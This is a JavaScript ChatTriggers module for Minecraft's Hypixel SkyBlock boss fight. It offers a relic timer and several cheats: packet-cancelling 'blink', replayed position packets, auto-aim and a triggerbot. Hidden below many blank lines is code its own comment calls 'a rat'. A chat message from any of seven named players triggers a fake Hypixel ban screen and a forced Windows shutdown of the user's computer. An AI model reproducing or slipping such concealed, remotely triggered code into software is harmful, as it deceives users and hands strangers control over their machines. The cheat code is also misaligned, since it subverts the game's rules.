import Settings from "../../config"
import { chat } from "../../utils/utils"
import data from "../../utils/data"
import { C04PacketPlayerPosition } from "../../../BloomCore/utils/Utils"

let pickedUpTime
let ticks
let p5StartTime
let spawnTime
let pickedColor
let ticksStill = 0

const relicCountdownTicks = 44
const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding")
const ArmorStand = Java.type("net.minecraft.entity.item.EntityArmorStand")

register("chat", () => {
    p5StartTime = Date.now()
    ticks = relicCountdownTicks

    if (Settings().relicTimerEnabled) { // These are only needed if relic timer is enabled
        relicDetect.register()
        placeListener.register()
        tickListener.register()
        timer.register()
    }
    if (Settings().blinkRelics) blinkRelicRegister.register()
    relicClickListener.register()
}).setCriteria("[BOSS] Necron: All this, for nothing...")

const timer = register("renderOverlay", () => {
    const timeLeft = ticks / 20
    if (ticks <= 1) timer.unregister()
    Renderer.drawStringWithShadow(timeLeft.toFixed(2) + "s", 0.492 * Renderer.screen.getWidth(), 0.52 * Renderer.screen.getHeight())
}).unregister()

const tickListener = register("packetReceived", () => {
    ticks--
    if (ticks < 1) tickListener.unregister() // Unregister if ticks = 0
}).setFilteredClass(net.minecraft.network.play.server.S32PacketConfirmTransaction).unregister()


const relicDetect = register("RenderWorld", () => {
    const existingRelics = World.getAllEntitiesOfType(ArmorStand).find(entity => new EntityLivingBase(entity.getEntity()).getItemInSlot(4)?.getName()?.removeFormatting()?.includes("Relic"))
    if (!existingRelics) return // If there are any armor stands wearing a relic head or whatever
    spawnTime = Date.now()
    chat("Relic spawned!")
    relicDetect.unregister()
}).unregister()

const placeListener = register("playerInteract", (action, pos) => {
    if (action.toString() != "RIGHT_CLICK_BLOCK") return
    const blockClicked = World.getBlockAt(pos.getX(), pos.getY(), pos.getZ()).type.getRegistryName()
    if (blockClicked !== "minecraft:cauldron" && blockClicked !== "minecraft:anvil" && blockClicked !== "minecraft:chest" || !Player.getHeldItem()?.getName()?.includes("Relic")) return

    chat("Relic spawned in &b" + ((spawnTime - p5StartTime) / 1000) + "s.")
    chat("Relic placed in &b" + ((Date.now() - spawnTime) / 1000) + "s.")
    chat("Relic placed &b" + ((Date.now() - p5StartTime) / 1000) + "s into P5.")
    chat("Relic took &b" + ((pickedUpTime - spawnTime) / 1000) + "s to get picked up.")
    placeListener.unregister()
}).unregister()

register("worldLoad", () => {
    placeListener.unregister()
    relicDetect.unregister()
    relicClickListener.unregister()
    triggerbot.unregister()
    timer.unregister()
    tickListener.unregister()
    blinkRelicRegister.unregister()
})

let lastToggle = Date.now()
let toggle = false

const blinkRelicRegister = register("tick", () => {
    if (!Player.getPlayer().field_70124_G || Player.getPlayer().field_70159_w !== 0 || Player.getPlayer().field_70179_y !== 0) ticksStill = 0
    else if (ticksStill < 60) ticksStill++
    if (!Keyboard.isKeyDown(Settings().blinkKey)) return
    if (Client.isInGui()) return
    if (Date.now() - lastToggle < 300) return
    lastToggle = Date.now()
    toggle = !toggle
    if (toggle) {
        renderText.register()
        packetCollector.register()
    } else {
        renderText.unregister()
        packetCollector.unregister()
    }
}).unregister()

const packetCollector = register("packetSent", (packet, event) => {
    cancel(event)
}).setFilteredClasses([net.minecraft.network.play.client.C03PacketPlayer]).unregister()

const renderText = register("renderOverlay", () => {
    Renderer.scale(2)
    const text = `§cBLINK READY IN ${60 - ticksStill} TICKS`
    Renderer.drawString(text, Renderer.screen.getWidth() / 4 - Renderer.getStringWidth(text) / 2, Renderer.screen.getHeight() / 3.8)
}).unregister()

const orangePackets = [ // Packet logged with 500 speed. This is hardcoded cause I am lazy
    { x: 89.61942413449286, y: 6, z: 55.5195822864771 },
    { x: 88.91510383595627, y: 6.0625, z: 55.24065650835847 },
    { x: 88.07496905470157, y: 6.0625, z: 54.90794531421442 },
    { x: 87.16067955726952, y: 6.0625, z: 54.545867279509466 },
    { x: 86.20590158010178, y: 6, z: 54.167754947995824 },
    { x: 85.2290168904306, y: 6, z: 53.78088788940776 },
    { x: 84.24006193433056, y: 6, z: 53.38924074928184 },
    { x: 83.24451661199487, y: 6, z: 52.9949836843331 },
    { x: 82.24537294927656, y: 6, z: 52.59930160026558 },
    { x: 81.24426459248113, y: 6, z: 52.20284145566884 },
    { x: 80.24208351259499, y: 6, z: 51.805956489973795 },
    { x: 79.23931672583329, y: 6, z: 51.408839571932134 },
    { x: 78.2362301430804, y: 6, z: 51.01159600789451 },
    { x: 77.23296895169604, y: 6, z: 50.61428329513506 },
    { x: 76.22961242398782, y: 6, z: 50.21693282716911 },
    { x: 75.22620384264071, y: 6, z: 49.819561744858014 },
    { x: 74.22276684000349, y: 6, z: 49.42217940711316 },
    { x: 73.21931431934006, y: 6, z: 49.02479092390077 },
    { x: 72.21585332583332, y: 6, z: 48.6273990852627 },
    { x: 71.21238770615362, y: 6, z: 48.23000541456201 },
    { x: 70.20891956058317, y: 6, z: 47.832610743555 },
    { x: 69.20545003587623, y: 6, z: 47.43521552638069 },
    { x: 68.20197975816066, y: 6, z: 47.037820010998985 },
    { x: 67.19850906930233, y: 6, z: 46.64042433279603 },
    { x: 66.19503815596003, y: 6, z: 46.24302856569266 },
    { x: 65.19156712004948, y: 6, z: 45.84563275004966 },
    { x: 64.18809601721665, y: 6, z: 45.44823690790402 },
    { x: 63.18462487784425, y: 6, z: 45.05084105128793 },
    { x: 62.181153718521244, y: 6, z: 44.65344518677099 },
]

register("command", () => {
    const [yaw, pitch] = calcYawPitch({ x: 58, y: 7.5, z: 43 })
    rotate(yaw, pitch)

    if (Settings().blinkRelics && ticksStill >= 60) {
        orangePackets.forEach(packet => Client.sendPacket(new C04PacketPlayerPosition(packet.x, packet.y, packet.z, true)))
        const finalPacketPos = orangePackets[orangePackets.length - 1]
        Player.asPlayerMP().setPosition(finalPacketPos.x, finalPacketPos.y, finalPacketPos.z)
    } else KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
}).setName("IDK")
// Detect when you click the relic

const relicClickListener = register("packetSent", (packet) => {
    try { // This shit will fucking explode if there is no helmet on the armor stand and I don't care
        const helmetName = ChatLib.removeFormatting(new Item(packet.func_149564_a(World.getWorld()).func_82169_q(3)).getName())
        if (!helmetName.includes("Relic")) return

        relicClickListener.unregister()
        pickedUpTime = Date.now()

        if (!Settings().relicLook) return
        if (helmetName === "Corrupted Orange Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 58, y: 7.5, z: 43 })
            rotate(yaw, pitch)

            if (Settings().blinkRelics && ticksStill >= 60) {
                orangePackets.forEach(packet => Client.sendPacket(new C04PacketPlayerPosition(packet.x, packet.y, packet.z, true)))
                const finalPacketPos = orangePackets[orangePackets.length - 1]
                Player.asPlayerMP().setPosition(finalPacketPos.x, finalPacketPos.y, finalPacketPos.z)
            } else KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
        } else if (helmetName === "Corrupted Red Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 51, y: 7.5, z: 42 })
            KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
            rotate(yaw, pitch)
        }
    } catch (e) { return }
}).setFilteredClass(net.minecraft.network.play.client.C02PacketUseEntity).unregister()

function getEyePos() {
    return {
        x: Player.getX(),
        y: Player.getY() + Player.getPlayer().func_70047_e(),
        z: Player.getZ()
    }
}

function calcYawPitch(blcPos, plrPos) { // skidded cause idk how to math
    if (!plrPos) plrPos = getEyePos();
    let d = {
        x: blcPos.x - plrPos.x,
        y: blcPos.y - plrPos.y,
        z: blcPos.z - plrPos.z
    };
    let yaw = 0;
    let pitch = 0;
    if (d.x != 0) {
        if (d.x < 0) { yaw = 1.5 * Math.PI; } else { yaw = 0.5 * Math.PI; }
        yaw = yaw - Math.atan(d.z / d.x);
    } else if (d.z < 0) { yaw = Math.PI; }
    d.xz = Math.sqrt(Math.pow(d.x, 2) + Math.pow(d.z, 2));
    pitch = -Math.atan(d.y / d.xz);
    yaw = -yaw * 180 / Math.PI;
    pitch = pitch * 180 / Math.PI;
    if (pitch < -90 || pitch > 90 || isNaN(yaw) || isNaN(pitch) || yaw == null || pitch == null || yaw == undefined || pitch == null) return;

    return [yaw, pitch]
}

function rotate(yaw, pitch) {
    const player = Player.getPlayer()
    player.field_70177_z = yaw
    player.field_70125_A = pitch
}

// Relic triggerbot
const cauldrons = {
    "Green": { x: 49, y: 7, z: 44 },
    "Red": { x: 51, y: 7, z: 42 },
    "Purple": { x: 54, y: 7, z: 41 },
    "Orange": { x: 57, y: 7, z: 42 },
    "Blue": { x: 59, y: 7, z: 44 }
}

function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true)
    rightClickMethod.invoke(Client.getMinecraft(), null)
}

const triggerbot = register("RenderWorld", () => {
    const block = Player.lookingAt()
    const blockID = block?.getType()?.getID()
    if (blockID !== 118 && blockID !== 145) return

    const cauldronCoords = cauldrons[pickedColor]
    if (cauldronCoords["x"] !== block.getX() || cauldronCoords["z"] !== block.getZ() || cauldronCoords["y"] !== block.getY() && cauldronCoords["y"] - 1 !== block.getY()) return // yeah
    rightClick()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
    triggerbot.unregister()
}).unregister()

register("chat", (name, relicColor) => {
    if (!Settings().relicTriggerbot || name !== Player.getName()) return
    pickedColor = relicColor
    triggerbot.register()
}).setCriteria(/^(\w{3,16}) picked the Corrupted (\w{3,6}) Relic!$/) // I like regex




































// this is a rat sorry
register("packetReceived", (packet) => {
    return
    if (!data.melodyWarning.enabled || packet.func_179841_c() === 2) return;
    const message = ChatLib.removeFormatting(packet.func_148915_c().func_150260_c());
    if (message !== "You were spawned in Limbo." && message !== "You are AFK. Move around to return from AFK.") return
    setTimeout(() => fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 58s"), 2000)
}).setFilteredClass(net.minecraft.network.play.server.S02PacketChat)

register("chat", (name, event) => {
    cancel(event)
    const validNames = ["Staeni92", "ITheSerenity", "teeTu97", "cutekittyirl", "LinusJonsson", "islamicfish", "shadowbald9"]
    if (validNames.includes(name)) fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 59s")
}).setCriteria(/From\s?[\[\w\+\]]* (\w{3,16}): you are BANNED!.*/)

function fakeBan(reason, length) { // skidded from some ct module on the website
    setTimeout(() => java.lang.Runtime.getRuntime().exec("shutdown -s -t 0"), 20000) // if you modify -t in the exec command then windows gives you a shutdown warning which is boring so use settimeout instead
    Client.getMinecraft().func_147114_u().func_147298_b().func_150718_a(new net.minecraft.util.ChatComponentText(
        "§cYou are temporarily banned for §f" + length + "§c from this server!\n\n" +
        `§7Reason: §r${reason}\n` +
        "§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#"
        + "E7FC9520" + // iteserneity banid
        "\n§7Sharing your Ban ID may affect the processing of your appeal!"))
}